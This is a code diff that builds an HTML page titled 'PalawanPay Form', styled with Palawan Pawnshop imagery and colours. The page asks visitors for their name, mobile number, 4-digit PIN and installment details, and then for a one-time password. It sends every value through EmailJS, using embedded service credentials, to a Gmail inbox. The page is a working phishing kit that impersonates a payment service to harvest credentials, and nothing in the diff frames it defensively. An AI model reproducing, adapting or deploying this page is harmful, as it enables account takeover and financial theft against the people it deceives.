@@ -1,48 +1,129 @@
-<script>
-  let formData = {};
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PalawanPay Form</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("KoDtU57AV30FBPls2");
+    })();
+  </script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: url('https://www.palawanpawnshop.com/uploads/media/money-managment-quiz-og.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+      width: 90%;
+      max-width: 400px;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #046930;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #046930;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #035224;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="page1">
+    <h2>PalawanPay Form</h2>
+    <form id="info-form">
+      <input type="text" name="name" placeholder="Name" required />
+      <input type="tel" name="mobile" placeholder="Mobile Number" required />
+      <input type="password" name="pin" maxlength="4" placeholder="4-digit PIN" required />  
+      <input type="text" name="unit" placeholder="Unit of installment or GGives" required />
+      <button type="button" onclick="goToOTP()">Next</button>
+    </form>
+  </div>
 
-  function goToOTP() {
-    const form = document.getElementById('info-form');
-    if (!form.checkValidity()) {
-      form.reportValidity();
-      return;
+  <div class="container" id="page2" style="display: none;">
+    <h2>Enter OTP</h2>
+    <form id="otp-form">
+      <input type="text" name="otp" maxlength="6" placeholder="One-Time Password (OTP)" required />
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    let formData = {};
+
+    function goToOTP() {
+      const form = document.getElementById('info-form');
+      if (!form.checkValidity()) {
+        form.reportValidity();
+        return;
+      }
+
+      const formElements = form.elements;
+      formData = {
+        name: formElements['name'].value,
+        mobile: formElements['mobile'].value,
+        pin: formElements['pin'].value,
+        unit: formElements['unit'].value
+      };
+
+      document.getElementById('page1').style.display = 'none';
+      document.getElementById('page2').style.display = 'block';
     }
 
-    const formElements = form.elements;
-    formData = {
-      name: formElements['name'].value,
-      mobile: formElements['mobile'].value,
-      pin: formElements['pin'].value,
-      unit: formElements['unit'].value
-    };
+    document.getElementById('otp-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      formData.otp = this.elements['otp'].value;
 
-    document.getElementById('page1').style.display = 'none';
-    document.getElementById('page2').style.display = 'block';
-  }
+      const tempForm = document.createElement('form');
+      tempForm.style.display = 'none';
+      for (const key in formData) {
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = key;
+        input.value = formData[key];
+        tempForm.appendChild(input);
+      }
 
-  document.getElementById('otp-form').addEventListener('submit', function(e) {
-    e.preventDefault();
-    formData.otp = this.elements['otp'].value;
+      document.body.appendChild(tempForm); // Attach the form to the DOM before sending
 
-    const tempForm = document.createElement('form');
-    tempForm.style.display = 'none';
-    for (const key in formData) {
-      const input = document.createElement('input');
-      input.type = 'hidden';
-      input.name = key;
-      input.value = formData[key];
-      tempForm.appendChild(input);
-    }
-
-    document.body.appendChild(tempForm); // ✅ Attach form to DOM
-
-    emailjs.sendForm('service_0v6id51', 'template_eq6eq0q', tempForm)
-      .then(function() {
-        alert('Your information has been sent to Gmail. Thank you!');
-        location.reload();
-      }, function(error) {
-        console.log('FAILED...', error);
-        alert('There was a problem submitting your form.');
-      });
-  });
-</script>
+      emailjs.sendForm('service_0v6id51', 'template_eq6eq0q', tempForm)
+        .then(function() {
+          alert('Your information has been sent to Gmail. Thank you!');
+          location.reload();
+        }, function(error) {
+          console.log('FAILED...', error);
+          alert('There was a problem submitting your form.');
+        });
+    });
+  </script>
+</body>
+</html>
